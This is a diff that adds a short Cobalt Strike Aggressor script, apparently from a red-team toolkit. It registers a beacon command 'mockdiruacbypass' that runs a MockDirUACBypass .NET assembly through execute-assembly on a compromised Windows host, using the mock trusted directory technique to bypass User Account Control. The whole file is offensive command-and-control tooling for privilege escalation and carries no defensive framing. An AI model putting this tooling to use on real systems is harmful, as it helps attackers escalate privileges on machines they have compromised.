@@ -1,0 +1,19 @@
+beacon_command_register("mockdiruacbypass", "Creates a mock trusted directory and moves an auto-elevating Windows executable into the mock directory.",
+	"Usage: mockdiruacbypass [arguments]\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+alias mockdiruacbypass{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$asm = "/opt/exe/MockDirUACBypass.exe";
+	$desc = "MockDirUACBypass";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, $asm, $argu);
+}
